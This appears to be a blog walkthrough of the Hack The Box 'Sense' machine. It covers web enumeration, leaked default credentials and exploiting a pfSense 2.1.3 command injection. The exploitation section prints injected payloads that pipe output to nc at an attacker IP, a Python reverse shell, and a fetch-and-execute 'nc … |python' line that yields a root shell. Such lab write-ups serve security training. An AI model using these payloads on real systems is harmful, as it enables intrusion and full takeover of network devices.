---
layout: single
title: Sense Writeup
date: '2020-01-15 07:32:44'
tags:
- hack-the-box
classes: wide
sidebar:
  - title: "Difficulty: Easy"
    image: /images/posts/2020/2020-01-15-sense-writeup/sense.png
    text: "https://app.hackthebox.eu/machines/111"
typora-copy-images-to: ../../images/posts/2020/${filename}/
---
An interesting box that teaches the value of thorough enumeration.…

## Enumeration

Starting with Autorecon we find that only ports 80 & 443 are open. While waiting for the web tests to complete I went to port 80 in Firefox and found I was redirected to HTTPS and that the system seemed to be a PFSense firewall.

Googling the default PFsense credentials and trying them didn't turn anything up, and some other common username/password combinations also failed. Given this is basically a security appliance it wasn't much of a surprise that the usual enumeration techniques that Autorecon runs didn't turn up anything.

Looking at ExploitDB for PFsense vulnerabilities turns up quite a few, however they generally need credentials.

At this point it's time to run some more intensive enumeration, specifically try and brute force directories and files in the webtree. Autorecon runs a light touch brute force using the Web-Content/common.txt list from [Seclists](https://github.com/danielmiessler/SecLists), but this won't always find what is needed. I started another `gobuster` with a more intensive list, looking for some common files that can be left around on a web server:

```bash
gobuster dir -u https://10.10.10.60:443/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403" -x "txt,html,php,asp,aspx,bak"
```
Given the number of extensions this took a couple of hours but turned up a couple of interesting files, including one called system-users.txt:
```
    ####Support ticket###
    
    Please create the following user
    
    username: Rohit
    password: company defaults
```
If we then try and login as Rohit:pfsense (which is the default PFsense password) it fails, but trying rohit:pfsense we manage to login.

## Exploitation

On logging in we can see that PFsense is running the 2.1.3 release. Exploitdb lists [this](https://www.exploit-db.com/exploits/43560) vulnerability which seems relevant.

To test it out we can start up Burp Suite and then set our browser to send traffic through the Burp Suite proxy. If we browse to the affected URL we can capture the request and send it to the Repeater component so we can edit it:

![Screenshot-from-2020-01-14-16-00-02](../../images/posts/2020/2020-01-15-sense-writeup/Screenshot-from-2020-01-14-16-00-02.png)

From the CVE details we know that you can specify arbitrary shell commands by using a semicolon. We can test this is working, by sending a sleep command:


![Screenshot-from-2020-01-14-16-01-19](../../images/posts/2020/2020-01-15-sense-writeup/Screenshot-from-2020-01-14-16-01-19.png)

If this takes 10+ seconds to return, we have command execution. As this is an HTTP request data needs to be URL Encoded, hence the + instead of a space.

Due to the way the vulnerability works, nothing is outputted to stdout and so won't appear in the results of the web request. However we can pipe the results to `nc`, which is handily installed in this case.

If we send `database=queues;whoami|nc+<ip_address>+<port>` with a listener on our machine, we can get the output of the command.

![Screenshot-from-2020-01-14-16-07-39](../../images/posts/2020/2020-01-15-sense-writeup/Screenshot-from-2020-01-14-16-07-39.png)

So, running as root, that's handy as we won't need to do any privilege escalation.

### Putting it all together

So, now we know we can run remote commands, lets see about getting a shell.

First we take a common Python reverse [shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and tidy it up into a script:
```python
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.2",9876))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
```
and save this as `exploit`.

We then start a listener on port 1234 and tell it to send the contents of the `exploit` file whenever anything connects:
```bash
    nc -lvp 1234 < exploit
```
We start another listener to catch the connections spawned by the reverse shell
```bash
    nc -lvp 9876
```
And finally we use Burp Suite to send our exploit:

`database=queues;nc+10.10.14.2+1234|python`

Which will send any data received from the connection to port 1234 (our Python reverse shell) to the Python interpreter. We need to `ctrl-c` the connection to port 1234 but after doing this we catch a root shell on 9876 which makes it trivial to grab the flags.

